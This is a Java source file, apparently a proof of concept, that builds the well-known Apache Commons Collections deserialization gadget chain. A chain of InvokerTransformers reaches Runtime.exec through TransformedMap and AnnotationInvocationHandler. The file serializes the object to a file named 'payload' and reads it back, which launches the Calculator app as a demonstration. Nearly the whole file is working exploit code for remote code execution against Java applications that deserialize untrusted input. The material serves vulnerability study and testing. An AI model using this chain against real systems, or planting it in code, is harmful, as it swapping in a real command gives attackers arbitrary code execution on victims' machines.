import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;


import java.io.*;
import java.lang.annotation.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class TransformedMapTest {

    private static Object createPayload() throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),

                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),

                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"open /Applications/Calculator.app"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "a");
        Map outMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Target.class, outMap);
        return instance;
    }

    private static void createPayloadFile(Object object, String file)
            throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File(file)));
        objectOutputStream.writeObject(object);
        objectOutputStream.flush();
        objectOutputStream.close();
    }

    private static void payloadTest(String file) throws Exception {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));
        Object o = objectInputStream.readObject();
        System.out.println(o);
        objectInputStream.close();
    }

    public static void main(String[] args) throws Exception {
        createPayloadFile(createPayload(),"payload");
        payloadTest("payload");
    }
}
